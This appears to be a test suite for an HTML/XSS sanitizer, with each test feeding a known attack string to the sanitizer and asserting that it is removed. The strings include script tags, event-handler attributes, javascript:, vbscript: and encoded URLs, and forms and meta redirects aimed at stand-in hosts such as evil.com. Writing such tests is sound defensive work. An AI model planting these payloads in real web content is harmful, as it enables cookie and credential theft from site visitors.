///| XSS Sanitizer Tests
///|
///| Test cases for common XSS attack vectors

// =============================================================================
// Basic Sanitization Tests
// =============================================================================

test "sanitize: pass through safe HTML" {
  let html = "<p>Hello <strong>world</strong>!</p>"
  let result = sanitize(html)
  assert_eq(result.content, html)
  assert_eq(result.was_modified, false)
}

test "sanitize: remove script tags" {
  let html = "<script>alert('XSS')</script>"
  let result = sanitize(html)
  assert_eq(result.content, "")
  assert_eq(result.was_modified, true)
  assert_eq(result.removed.length() > 0, true)
}

test "sanitize: remove inline script" {
  let html = "<p>Hello</p><script>alert(1)</script><p>World</p>"
  let result = sanitize(html)
  assert_eq(result.content, "<p>Hello</p><p>World</p>")
}

// =============================================================================
// Event Handler Tests (onerror, onclick, etc.)
// =============================================================================

test "sanitize: remove img onerror" {
  let html = "<img src=\"x\" onerror=\"alert('XSS')\">"
  let result = sanitize(html)
  assert_eq(result.content.contains("onerror"), false)
  assert_eq(result.content.contains("src"), true)
}

test "sanitize: remove svg onload" {
  let config = SanitizeConfig::permissive()
  let html = "<svg onload=\"alert('XSS')\"></svg>"
  let result = sanitize(html, config~)
  assert_eq(result.content.contains("onload"), false)
}

test "sanitize: remove onclick" {
  let html = "<button onclick=\"stealCookies()\">Click me</button>"
  let result = sanitize(html)
  assert_eq(result.content.contains("onclick"), false)
}

test "sanitize: remove onmouseover" {
  let html = "<div onmouseover=\"alert('XSS')\">Hover me</div>"
  let result = sanitize(html)
  assert_eq(result.content.contains("onmouseover"), false)
}

test "sanitize: remove onfocus" {
  let html = "<input onfocus=\"alert('XSS')\" autofocus>"
  let result = sanitize(html)
  assert_eq(result.content.contains("onfocus"), false)
}

// =============================================================================
// JavaScript URL Tests
// =============================================================================

test "sanitize: remove javascript: href" {
  let html = "<a href=\"javascript:alert('XSS')\">Click me</a>"
  let result = sanitize(html)
  assert_eq(result.content.contains("javascript:"), false)
}

test "sanitize: remove javascript: with spaces" {
  let html = "<a href=\"   javascript:alert('XSS')\">Click me</a>"
  let result = sanitize(html)
  assert_eq(result.content.contains("javascript:"), false)
}

test "sanitize: remove vbscript: href" {
  let html = "<a href=\"vbscript:msgbox('XSS')\">Click me</a>"
  let result = sanitize(html)
  assert_eq(result.content.contains("vbscript:"), false)
}

test "sanitize: allow safe http: links" {
  let html = "<a href=\"https://example.com\">Link</a>"
  let result = sanitize(html)
  assert_eq(result.content.contains("https://example.com"), true)
}

test "sanitize: allow mailto: links" {
  let html = "<a href=\"mailto:test@example.com\">Email</a>"
  let result = sanitize(html)
  assert_eq(result.content.contains("mailto:"), true)
}

// =============================================================================
// Iframe and Embed Tests
// =============================================================================

test "sanitize: remove iframe" {
  let html = "<iframe src=\"https://evil.com\"></iframe>"
  let result = sanitize(html)
  assert_eq(result.content, "")
}

test "sanitize: remove embed" {
  let html = "<embed src=\"evil.swf\">"
  let result = sanitize(html)
  assert_eq(result.content, "")
}

test "sanitize: remove object" {
  let html = "<object data=\"evil.swf\"></object>"
  let result = sanitize(html)
  assert_eq(result.content, "")
}

// =============================================================================
// Data URL Tests
// =============================================================================

test "sanitize: block data: javascript" {
  let html = "<a href=\"data:text/html,<script>alert('XSS')</script>\">Click</a>"
  let result = sanitize(html)
  assert_eq(result.content.contains("data:text/html"), false)
}

test "sanitize: allow data: image URLs" {
  let html = "<img src=\"data:image/png;base64,iVBORw0KGgo=\">"
  let result = sanitize(html)
  assert_eq(result.content.contains("data:image/png"), true)
}

test "sanitize: block data: image with onerror" {
  let html = "<img src=\"data:image/png;onerror=alert(1)\">"
  let result = sanitize(html)
  assert_eq(result.content.contains("onerror"), false)
}

// =============================================================================
// SVG Tests
// =============================================================================

test "sanitize: remove SVG by default" {
  let html = "<svg><circle cx=\"50\" cy=\"50\" r=\"40\"/></svg>"
  let result = sanitize(html)
  assert_eq(result.content, "")
}

test "sanitize: allow SVG when enabled" {
  let config = SanitizeConfig::permissive()
  let html = "<svg><circle cx=\"50\" cy=\"50\" r=\"40\"/></svg>"
  let result = sanitize(html, config~)
  assert_eq(result.content.contains("svg"), true)
  assert_eq(result.content.contains("circle"), true)
}

test "sanitize: remove SVG with script" {
  let config = SanitizeConfig::permissive()
  let html = "<svg><script>alert(1)</script></svg>"
  let result = sanitize(html, config~)
  assert_eq(result.content.contains("script"), false)
}

// =============================================================================
// Style Tag Tests
// =============================================================================

test "sanitize: remove style tags" {
  let html = "<style>body { background: url('javascript:alert(1)') }</style>"
  let result = sanitize(html)
  assert_eq(result.content, "")
}

// =============================================================================
// Form Tests
// =============================================================================

test "sanitize: remove form tags" {
  let html = "<form action=\"https://evil.com/steal\"><input name=\"password\"></form>"
  let result = sanitize(html)
  assert_eq(result.content.contains("form"), false)
}

test "sanitize: remove formaction attribute" {
  let html = "<button formaction=\"https://evil.com\">Submit</button>"
  let result = sanitize(html)
  assert_eq(result.content.contains("formaction"), false)
}

// =============================================================================
// Meta/Base Tests
// =============================================================================

test "sanitize: remove meta tags" {
  let html = "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.com\">"
  let result = sanitize(html)
  assert_eq(result.content, "")
}

test "sanitize: remove base tags" {
  let html = "<base href=\"https://evil.com\">"
  let result = sanitize(html)
  assert_eq(result.content, "")
}

// =============================================================================
// Attribute Tests
// =============================================================================

test "sanitize: keep safe attributes" {
  let html = "<p class=\"highlight\" id=\"intro\">Hello</p>"
  let result = sanitize(html)
  assert_eq(result.content.contains("class=\"highlight\""), true)
  assert_eq(result.content.contains("id=\"intro\""), true)
}

test "sanitize: keep data-* attributes by default" {
  let html = "<div data-value=\"123\">Content</div>"
  let result = sanitize(html)
  assert_eq(result.content.contains("data-value"), true)
}

test "sanitize: keep aria-* attributes by default" {
  let html = "<button aria-label=\"Close\">X</button>"
  let result = sanitize(html)
  assert_eq(result.content.contains("aria-label"), true)
}

// =============================================================================
// Configuration Tests
// =============================================================================

test "sanitize: strict mode removes all HTML" {
  let config = SanitizeConfig::strict()
  let html = "<p>Hello <b>world</b>!</p>"
  let result = sanitize(html, config~)
  assert_eq(result.content, "Hello world!")
}

test "sanitize: custom forbidden tags" {
  let config : SanitizeConfig = {
    ..SanitizeConfig::default(),
    forbidden_tags: ["marquee", "blink"],
  }
  let html = "<marquee>Scrolling</marquee><p>Normal</p>"
  let result = sanitize(html, config~)
  assert_eq(result.content.contains("marquee"), false)
  assert_eq(result.content.contains("p>Normal"), true)
}

// =============================================================================
// Web Components / Custom Elements Tests
// =============================================================================

test "sanitize: custom elements blocked by default" {
  let html = "<my-component>Content</my-component>"
  let result = sanitize(html)
  assert_eq(result.content.contains("my-component"), false)
  assert_eq(result.content.contains("Content"), true)
}

test "sanitize: custom elements allowed with flag" {
  let config : SanitizeConfig = {
    ..SanitizeConfig::default(),
    allow_custom_elements: true,
  }
  let html = "<my-component>Content</my-component>"
  let result = sanitize(html, config~)
  assert_eq(result.content.contains("my-component"), true)
  assert_eq(result.content.contains("Content"), true)
}

test "sanitize: custom elements filtered by whitelist" {
  let config : SanitizeConfig = {
    ..SanitizeConfig::default(),
    allow_custom_elements: true,
    allowed_custom_elements: ["my-button", "my-input"],
  }
  let html = "<my-button>Click</my-button><my-evil>Bad</my-evil><my-input/>"
  let result = sanitize(html, config~)
  assert_eq(result.content.contains("my-button"), true)
  assert_eq(result.content.contains("my-input"), true)
  assert_eq(result.content.contains("my-evil"), false)
}

test "sanitize: with_custom_elements helper" {
  let config = SanitizeConfig::with_custom_elements(["x-button", "x-card"])
  let html = "<x-button>Click</x-button><x-card>Card</x-card><x-other>Other</x-other>"
  let result = sanitize(html, config~)
  assert_eq(result.content.contains("x-button"), true)
  assert_eq(result.content.contains("x-card"), true)
  assert_eq(result.content.contains("x-other"), false)
}

test "sanitize: custom elements preserve attributes" {
  let config = SanitizeConfig::with_custom_elements(["my-element"])
  let html = "<my-element data-value=\"123\" class=\"styled\">Content</my-element>"
  let result = sanitize(html, config~)
  assert_eq(result.content.contains("data-value"), true)
  assert_eq(result.content.contains("class=\"styled\""), true)
}

test "sanitize: custom elements strip event handlers" {
  let config = SanitizeConfig::with_custom_elements(["my-element"])
  let html = "<my-element onclick=\"alert(1)\">Content</my-element>"
  let result = sanitize(html, config~)
  assert_eq(result.content.contains("my-element"), true)
  assert_eq(result.content.contains("onclick"), false)
}

// =============================================================================
// Comments Configuration Tests
// =============================================================================

test "sanitize: comments removed by default" {
  let html = "<p>Hello</p><!-- comment --><p>World</p>"
  let result = sanitize(html)
  assert_eq(result.content.contains("comment"), false)
  assert_eq(result.content, "<p>Hello</p><p>World</p>")
}

test "sanitize: comments allowed with flag" {
  let config : SanitizeConfig = {
    ..SanitizeConfig::default(),
    allow_comments: true,
  }
  let html = "<p>Hello</p><!-- comment --><p>World</p>"
  let result = sanitize(html, config~)
  assert_eq(result.content.contains("<!-- comment -->"), true)
}

// =============================================================================
// URL Sanitization Tests
// =============================================================================

test "sanitize_url: allow https" {
  let result = sanitize_url("https://example.com")
  assert_eq(result, Some("https://example.com"))
}

test "sanitize_url: allow http" {
  let result = sanitize_url("http://example.com")
  assert_eq(result, Some("http://example.com"))
}

test "sanitize_url: block javascript" {
  let result = sanitize_url("javascript:alert(1)")
  assert_eq(result, None)
}

test "sanitize_url: block vbscript" {
  let result = sanitize_url("vbscript:msgbox(1)")
  assert_eq(result, None)
}

test "sanitize_url: allow relative URLs" {
  let result = sanitize_url("/path/to/page")
  assert_eq(result, Some("/path/to/page"))
}

// =============================================================================
// is_safe_html Tests
// =============================================================================

test "is_safe_html: returns true for safe content" {
  let html = "<p>Hello <b>world</b></p>"
  assert_eq(is_safe_html(html), true)
}

test "is_safe_html: returns false for script" {
  let html = "<script>alert(1)</script>"
  assert_eq(is_safe_html(html), false)
}

test "is_safe_html: returns false for onerror" {
  let html = "<img onerror=\"alert(1)\">"
  assert_eq(is_safe_html(html), false)
}

// =============================================================================
// Helper Function Tests
// =============================================================================

test "is_event_handler: detects onclick" {
  assert_eq(is_event_handler("onclick"), true)
}

test "is_event_handler: detects onerror" {
  assert_eq(is_event_handler("onerror"), true)
}

test "is_event_handler: detects onload" {
  assert_eq(is_event_handler("onload"), true)
}

test "is_event_handler: allows class" {
  assert_eq(is_event_handler("class"), false)
}

test "is_event_handler: allows only" {
  // "only" starts with "on" but is not an event handler
  assert_eq(is_event_handler("on"), false)
}

test "is_allowed_tag: allows p" {
  let config = SanitizeConfig::default()
  assert_eq(is_allowed_tag("p", config), true)
}

test "is_allowed_tag: blocks script" {
  let config = SanitizeConfig::default()
  assert_eq(is_allowed_tag("script", config), false)
}

test "is_allowed_tag: case insensitive" {
  let config = SanitizeConfig::default()
  assert_eq(is_allowed_tag("SCRIPT", config), false)
  assert_eq(is_allowed_tag("P", config), true)
}

// =============================================================================
// Complex Attack Vector Tests
// =============================================================================

test "sanitize: nested script in SVG" {
  let config = SanitizeConfig::permissive()
  let html = "<svg><foreignObject><script>alert(1)</script></foreignObject></svg>"
  let result = sanitize(html, config~)
  assert_eq(result.content.contains("script"), false)
}

test "sanitize: encoded javascript URL" {
  let html = "<a href=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)\">Click</a>"
  let result = sanitize(html)
  // After decoding, should detect javascript:
  assert_eq(result.content.contains("alert"), false)
}

test "sanitize: mixed case script tag" {
  let html = "<ScRiPt>alert(1)</ScRiPt>"
  let result = sanitize(html)
  assert_eq(result.content, "")
}

test "sanitize: preserves text content" {
  let html = "<p>Hello <script>evil</script> world</p>"
  let result = sanitize(html)
  assert_eq(result.content, "<p>Hello  world</p>")
}

